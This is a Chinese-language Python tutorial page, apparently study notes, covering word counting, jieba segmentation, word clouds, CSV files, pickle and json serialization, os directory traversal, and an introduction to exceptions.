<h2 id="实例二-：统计单词次数"><a href="#实例二-：统计单词次数" class="headerlink" title="实例二 ：统计单词次数"></a>实例二 ：统计单词次数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">wordfre = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fp:</span><br><span class="line">    sword = i.strip().split()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> sword:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> wordfre:</span><br><span class="line">            wordfre[word]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            wordfre[word]=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;文档里共出现了%d个不同的单词&quot;</span>%<span class="built_in">len</span>(wordfre),<span class="string">&quot;统计如下：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(wordfre)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>与字母不同的是，这里要使用<code>sword = i.strip().split()</code>把原字符串以空格为分隔符号组成一个列表，其元素是一个个单词字符串。<br>其中<code>strip()</code>方法是消除<strong>头尾两边</strong>指定的字符，<strong>默认为空格和换行</strong>。</p>
<hr>
<blockquote>
<p>扩展：输出次数最多的三个单词</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">wordfre = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fp:</span><br><span class="line">    sword = i.strip().split()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> sword:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> wordfre:</span><br><span class="line">            wordfre[word]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            wordfre[word]=<span class="number">1</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;文档里共出现了%d个不同的单词&quot;</span>%<span class="built_in">len</span>(wordfre),<span class="string">&quot;统计如下：&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(wordfre)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">sorted</span>(wordfre.items(), key=<span class="keyword">lambda</span> e:e[<span class="number">1</span>], reverse=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;出现次数最多的三个单词为：&quot;</span>)</span><br><span class="line">	wordl = []</span><br><span class="line">	<span class="keyword">for</span> wd, num <span class="keyword">in</span> wordfre.items():</span><br><span class="line">		wordl.append((num, wd))</span><br><span class="line">	wordl.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">for</span> wd <span class="keyword">in</span> wordl[:<span class="number">3</span>]:</span><br><span class="line">		<span class="built_in">print</span>(wd)</span><br><span class="line">	fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上代码是使用字典存储字母次数。<br>一个关键点是：<code>dict.items()</code>会返回一个<strong>列表</strong>，列表里的元素是<strong>一个个元组</strong>。<br>所以我们如果要排序，可以直接使用<code>sorted(dict.items,key=lambda e:e[1])</code>以<strong>值为依据</strong>进行排序。结果返回一个新的列表。</p>
<h1 id="第三方库：单词处理"><a href="#第三方库：单词处理" class="headerlink" title="第三方库：单词处理"></a>第三方库：单词处理</h1><h2 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h2><blockquote>
<p>jieba是优秀的中文分词第三方库</p>
</blockquote>
<p>三种<strong>不同的模式</strong>：</p>
<ul>
<li>精确模式：把文本精确的切分开，不存在冗余单词</li>
<li>全模式：把文本中所有可能的词语都扫描出来，有冗余</li>
<li>搜索引擎模式：在精确模式基础上，对长词再次切分</li>
</ul>
<p><strong>常用的函数</strong>：</p>
<ul>
<li><code>jieba.cut(s)</code>:精确模式，返回一个可迭代的数据类型。</li>
<li><code>jieba.cut(s,cut_all=True)</code>:全模式，输出文本s中所有的可能单词</li>
<li><code>jieba.cut_for_search(s)</code>:搜索引擎模式，适合搜索引擎建立索引的分词结果</li>
<li><code>jieba.lcut(s)</code>:精确模式，返回一个列表，<strong>建议使用</strong></li>
<li><code>jieba.lcut(s,cut_all=True)</code>:全模式，返回一个列表，<strong>建议使用</strong></li>
<li><code>jieba.lcut_for_search(s)</code>:搜索引擎模式，返回一个列表，<strong>建议使用</strong></li>
<li><code>jieba.add_word(w)</code>:向分词词典中<strong>增加新词w</strong></li>
</ul>
<p>代码实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba <span class="keyword">as</span> j</span><br><span class="line"><span class="built_in">print</span>(j.lcut(<span class="string">&quot;中国是一个伟大的祖国&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(j.lcut(<span class="string">&quot;中国是一个伟大的祖国&quot;</span>, cut_all=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(j.lcut_for_search(<span class="string">&quot;中国是一个伟大的祖国&quot;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1647941379508.png"></p>
<h2 id="worldcloud库"><a href="#worldcloud库" class="headerlink" title="worldcloud库"></a>worldcloud库</h2><blockquote>
<p>wordcloud 库把词云当作一个WordCloud对象</p>
</blockquote>
<ul>
<li>wordcloud.WordCloud()代表一个文本对应的词云</li>
<li>可以根据文本中词语出现的频率等参数绘制词云</li>
<li>绘制词云的形状、尺寸和颜色均可设定</li>
<li>以WordCloud对象为基础，配置参数、加载文本、输出文件</li>
</ul>
<p><strong>具体参数如下</strong>：（配置对象参数）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806558.png"></p>
<p><strong>输入方法</strong>：<br><code>w.generate(file)</code>:向词云对象里加载文本</p>
<p><strong>输出方法</strong>：<br><code>w.to_file(filename)</code>:将词云输出为文件</p>
<p><strong>一个实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba <span class="keyword">as</span> j</span><br><span class="line"><span class="keyword">import</span> wordcloud <span class="keyword">as</span> w</span><br><span class="line"></span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;./2022政府工作报告.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">txt1 = txt.read()</span><br><span class="line"></span><br><span class="line">list1 = j.lcut(txt1)</span><br><span class="line">txt2 =<span class="string">&quot; &quot;</span>.join(list1)</span><br><span class="line">w = w.WordCloud(font_path=<span class="string">&#x27;msyhbd.ttc&#x27;</span>)</span><br><span class="line">w.generate(txt2)</span><br><span class="line">w.to_file(<span class="string">&quot;2022.jpg&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806566.png"></p>
<p>使用<code>jieba库</code>分好词语后可以通过<code>join</code>进行连接,在进行词云。</p>
<h2 id="实训：三国演义词云"><a href="#实训：三国演义词云" class="headerlink" title="实训：三国演义词云"></a>实训：三国演义词云</h2><h1 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h1><p><strong>csv文件的格式</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806118.png"></p>
<ol>
<li>使用open函数进行csv文件的读取<br><strong>看代码</strong>：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.csv&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">    ls = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fb:</span><br><span class="line">        i = i.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        ls.append(i.split(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(ls)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806152.png"></p>
<p><strong>注意点</strong>：<br>1、通过<code>for in</code> 一行行读取字符串，并<strong>去除换行符</strong>。<br>2、通过<code>split(&quot;,&quot;)</code>以逗号为分隔符进行字符串的分割，<strong>返回一个列表</strong>。</p>
<hr>
<ol start="2">
<li>使用csv模块进行：</li>
</ol>
<p><strong>看例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.csv&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">    csver = csv.reader(fb)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> csver:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806165.png"></p>
<ol start="3">
<li>使用csv模块进行写入：<br> <strong>看代码</strong>：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.csv&quot;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csver:</span><br><span class="line">    <span class="comment"># 创建writer对象用于写入</span></span><br><span class="line">    csver_w = csv.writer(csver)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fb:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fb.readlines():</span><br><span class="line">            line_list = line.strip(<span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            csver_w.writerow(line_list)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.csv&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csver:</span><br><span class="line">    csver_r = csv.reader(csver)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> csver_r:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br></pre></td></tr></table></figure>
<p>在使用<strong>open</strong>打开文件后再使用<strong>csv模块</strong>选择写入还是读取模式。</p>
<h1 id="序列化模块"><a href="#序列化模块" class="headerlink" title="序列化模块"></a>序列化模块</h1><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li><strong>序列化</strong>：把变量从内存变成可存储、可传输的过程。</li>
<li>序列化后的内容可以写入磁盘或者传输。</li>
<li><strong>反序列化</strong>：把序列化内容重新读入内存的过程。</li>
</ul>
<h2 id="模块：pickle"><a href="#模块：pickle" class="headerlink" title="模块：pickle"></a>模块：pickle</h2><blockquote>
<p>实现变量的序列化</p>
</blockquote>
<p><strong>基本操作：</strong></p>
<ul>
<li><code>p.dumps()</code>把任意对象序列化为一个bytes,然后可以把这个bytes写入文件夹。</li>
<li><code>p.dump()</code>把对象序列化后写入一个file-like Object。</li>
<li><code>p.loads()</code>将bytes反序列化出对象。</li>
<li><code>p.load()</code>将file-like Object 反序列化出对象</li>
</ul>
<p><strong>例子</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字典序列化为一个bytes</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">mydict = <span class="built_in">dict</span>(name=<span class="string">&quot;xyq&quot;</span>, age=<span class="number">21</span>)</span><br><span class="line">pickle_1 = p.dumps(mydict,fp)</span><br><span class="line"><span class="built_in">print</span>(pickle_1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果如下</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806166.png"></p>
<hr>
<p><strong>反序列化实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字典序列化并存储在c.txt</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">mydict = <span class="built_in">dict</span>(name=<span class="string">&quot;xyq&quot;</span>, age=<span class="number">21</span>)</span><br><span class="line">p.dump(mydict,fp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开c.txt，读取其中文件并反序列化为data</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;c.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    data = p.load(fp)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<h2 id="模块：json"><a href="#模块：json" class="headerlink" title="模块：json"></a>模块：json</h2><blockquote>
<p>定义介绍：</p>
</blockquote>
<p>json是现在流行的跨平台的<strong>数据交换格式</strong>。</p>
<p><strong>例如</strong>：jupyter配置文件就是json文件。</p>
<p>现在已经成为<strong>异构系统之间</strong>交换数据的<strong>事实标准</strong>。</p>
<p><strong>python数据类型和json类型对应关系</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806585.png"></p>
<blockquote>
<p>json模块介绍：</p>
</blockquote>
<p><strong>模式方法</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806562.png"></p>
<p><strong>注意</strong>：dumps是编码字符串，而dump是写入文件。前者有接收值，后者直接操作。&#x2F;&#x2F;字典或者列表可以转换。</p>
<hr>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xyq&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">json_str = json.dumps(dict1)</span><br><span class="line"><span class="built_in">print</span>(json_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(json_str))</span><br><span class="line"></span><br><span class="line">dict2 = json.loads(json_str)</span><br><span class="line"><span class="built_in">print</span>(dict2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dict2))</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806168.png"></p>
<p>也就是说，<code>json.dumps</code>将一个python的<strong>字典</strong>转换为了一个<strong>字符串</strong>，但是还是<strong>字典的样式</strong>。而后<code>json.loads</code>将json<strong>字符串</strong>转为了python<strong>字典</strong>。具体的转换原理<strong>见下实训</strong>。</p>
<h1 id="文件目录操作"><a href="#文件目录操作" class="headerlink" title="文件目录操作"></a>文件目录操作</h1><blockquote>
<p>思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806192.png"></p>
<h2 id="os模块和os-path"><a href="#os模块和os-path" class="headerlink" title="os模块和os.path"></a>os模块和os.path</h2><blockquote>
<p>这个模块是主要访问操作系统功能的模块</p>
</blockquote>
<blockquote>
<p>几个基本功能：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.name)  <span class="comment"># 操作系统名称</span></span><br><span class="line"><span class="built_in">print</span>(os.stat(<span class="string">&quot;./b.txt&quot;</span>))  <span class="comment"># 返回文件属性</span></span><br><span class="line">os.rename(<span class="string">&quot;b.txt&quot;</span>, <span class="string">&quot;os2.txt&quot;</span>)  <span class="comment"># 对文件进行重命名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.path.exists(<span class="string">&quot;./a.txt&quot;</span>))  <span class="comment"># 查看文件是否存在</span></span><br><span class="line"><span class="built_in">print</span>(os.path.isfile(<span class="string">&quot;os.txt&quot;</span>))   <span class="comment"># 查看是否为文件</span></span><br><span class="line"><span class="built_in">print</span>(os.path.split(<span class="string">&quot;os.txt&quot;</span>))    <span class="comment"># 分开文件和路径</span></span><br><span class="line"><span class="built_in">print</span>(os.path.splitext(<span class="string">&quot;os.txt&quot;</span>)) <span class="comment"># 分割文件名与扩展名</span></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806215.png"></p>
<blockquote>
<p>与操作目录有关的功能：</p>
</blockquote>
<p><strong>创建目录</strong>：</p>
<ul>
<li><code>os.listdir(&quot;目录&quot;)</code>：列出当前目录的内容</li>
<li><code>os.makedir(&quot;./xyq&quot;)</code>：在指定位置创建一个目录</li>
<li><code>os.makedirs(&quot;./xyq/name&quot;)</code>：在指定位置创建多级目录</li>
</ul>
<p><strong>删除目录</strong>：</p>
<ul>
<li><code>os.rmdir(&quot;./xyq&quot;)</code>:删除目录，要求此目录为空</li>
<li><code>os.removedirs(&quot;./xyq/xyz&quot;)</code>:删除多级目录</li>
</ul>
<p><strong>判断目录</strong>：</p>
<ul>
<li><code>os.pathisdir(&quot;./a.txt&quot;)</code>:判断是否为目录</li>
</ul>
<h2 id="os模块实训"><a href="#os模块实训" class="headerlink" title="os模块实训"></a>os模块实训</h2><p>将一个文件file1重命名为file2（考虑健壮性）</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, os.path</span><br><span class="line">file1 = <span class="built_in">input</span>(<span class="string">&quot;输入要重命名的文件：&quot;</span>)</span><br><span class="line">file2 = <span class="built_in">input</span>(<span class="string">&quot;输入重命名后的文件：&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_list = os.listdir(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> file1 <span class="keyword">in</span> file_list:</span><br><span class="line">    <span class="keyword">while</span>(file2 <span class="keyword">in</span> file_list):</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;有重名，是否继续(Y/N):&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&quot;Y&quot;</span> <span class="keyword">or</span> choice == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">            file2 = <span class="built_in">input</span>(<span class="string">&quot;输入新的名字：&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.rename(file1, file2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;命名成功！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件不存在。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806238.png"></p>
<p><strong>几个注意点</strong>：<br>1、使用<code>os.listdir</code>获取当前目录的文件，返回一个<strong>列表</strong>。用于<strong>判断是否有重命名文件</strong>。<br>2、使用<code>while else </code>进行重复输入。else语句是当<strong>while语句顺利执行后</strong>执行。</p>
<h2 id="遍历目录的三种方式"><a href="#遍历目录的三种方式" class="headerlink" title="遍历目录的三种方式"></a>遍历目录的三种方式</h2><blockquote>
<p>输出目录下的所有文件和目录</p>
</blockquote>
<blockquote>
<p><strong>第一种方法</strong>：<code>os.walk()函数</code></p>
<blockquote>
<p>返回值是一个<strong>生成器</strong>。返回值是一个<strong>三元组</strong>。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806565.png"></p>
<p><strong>看一个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806563.png"></p>
<p>可见，使用walk函数返回一个<strong>生成器</strong>，需要通过<code>next()</code>进行输出。<br>输出的格式为<strong>三元组</strong>：<code>当前目录，目录下的目录，目录下的文件</code>。</p>
<hr>
<p><strong>看一个例子：输出目录</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;目录不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    list_dir = os.walk(path)</span><br><span class="line">    <span class="keyword">for</span> root, dir1 , file1 <span class="keyword">in</span> list_dir:</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> dir1:</span><br><span class="line">            <span class="built_in">print</span>(os.path.join(root,d))</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> file1:</span><br><span class="line">            <span class="built_in">print</span>(os.path.join(root, f))</span><br><span class="line"></span><br><span class="line">visit(<span class="string">&quot;c:\\demo&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806369.png"><br><strong>注意点</strong>：<br>1、使用<code>os.path.join()</code>输出根目录。<br>2、注意<code>walk</code>返回的元组的元素，其中第二、三个是<strong>列表</strong>，可以进行for in 。</p>
<hr>
<p><strong>一个例子：计算指定路径下文件字节数，除去指定的路径</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, getsize</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;目录不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    list_dir = os.walk(path)</span><br><span class="line">    <span class="keyword">for</span> root, dir1 , file1 <span class="keyword">in</span> list_dir:</span><br><span class="line">        <span class="built_in">print</span>(root, <span class="string">&quot;consumes&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">sum</span>([getsize(join(root, name)) <span class="keyword">for</span> name <span class="keyword">in</span> file1]), end = <span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bytes in&quot;</span>, <span class="built_in">len</span>(file1), <span class="string">&quot;non-dir files&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;B&quot;</span> <span class="keyword">in</span> dir1:</span><br><span class="line">            dir1.remove(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">visit(<span class="string">&quot;c:\\demo&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806382.png"><br><strong>注意</strong>：<br>1、使用<code>os.path.getsize</code>获取文件的字节数。<br>2、使用到了<strong>列表生成器</strong>将多个文件的字节数放到列表。</p>
<hr>
<blockquote>
<p>第二个方法：深度遍历策略</p>
</blockquote>
<p><strong>看代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, isdir, isfile</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;目录不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    list_dir = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> list_dir:</span><br><span class="line">	   <span class="comment"># 必须先连接，才可以使用is方法判断类型</span></span><br><span class="line">        path1 = join(path, name)</span><br><span class="line">        <span class="keyword">if</span> isfile(path1):</span><br><span class="line">            <span class="built_in">print</span>(path1)</span><br><span class="line">        <span class="keyword">elif</span> isdir(path1):</span><br><span class="line">            <span class="built_in">print</span>(path1)</span><br><span class="line">            visit(path1)</span><br><span class="line"></span><br><span class="line">visit(<span class="string">&quot;c:\\demo&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806560.png"></p>
<p>深度优先遍历的关键在于<strong>如果发现目录就会直接进入</strong>，而不是输出别的文件。</p>
<blockquote>
<p>广度遍历策略：</p>
</blockquote>
<p><strong>看代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, isdir, isfile</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;目录不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    dirs = [path]</span><br><span class="line">    <span class="keyword">while</span> dirs:</span><br><span class="line">        current = dirs.pop(<span class="number">0</span>)</span><br><span class="line">        list_dir = os.listdir(current)</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(list_dir):</span><br><span class="line">			<span class="comment"># 必须先连接，才可以使用is方法判断类型</span></span><br><span class="line">            path1 = join(current, name)</span><br><span class="line">            <span class="keyword">if</span> isfile(path1):</span><br><span class="line">                <span class="built_in">print</span>(path1)</span><br><span class="line">            <span class="keyword">elif</span> isdir(path1):</span><br><span class="line">                <span class="built_in">print</span>(path1)</span><br><span class="line">                dirs.append(path1)</span><br><span class="line"></span><br><span class="line">visit(<span class="string">&quot;c:\\demo&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806732.png"></p>
<p>广度优先的关键在于<strong>使用了队列</strong>（利用列表的方法进行模拟）。</p>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><blockquote>
<p>思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806733.png"></p>
<h2 id="Python中的异常类"><a href="#Python中的异常类" class="headerlink" title="Python中的异常类"></a>Python中的异常类</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li><strong>语法错误</strong>：在解析代码时出现的错误。当代码不符合Python的语法规则是，会报错<code>SyntaxError</code>。</li>
<li><strong>运行时错误</strong>：语法正常，但是在运行时出现错误,但是是非致命的，即为异常。</li>
</ul>
<p><strong>什么是异常</strong>？异常是因为程序出错而在正常控制流以外采取的行为，当Python检测到一个错误时，解释器就会指出流无法进行。</p>
<blockquote>
<p>具体介绍：Python中的异常类</p>
</blockquote>
<p>python所有的错误都是从<code>BaseException类</code>派生的。常见的错误类型和继承关系如下：<br><a href="https://docs.python.org/zh-cn/3.8/library/exceptions.html">https://docs.python.org/zh-cn/3.8/library/exceptions.html</a></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806734.png"></p>
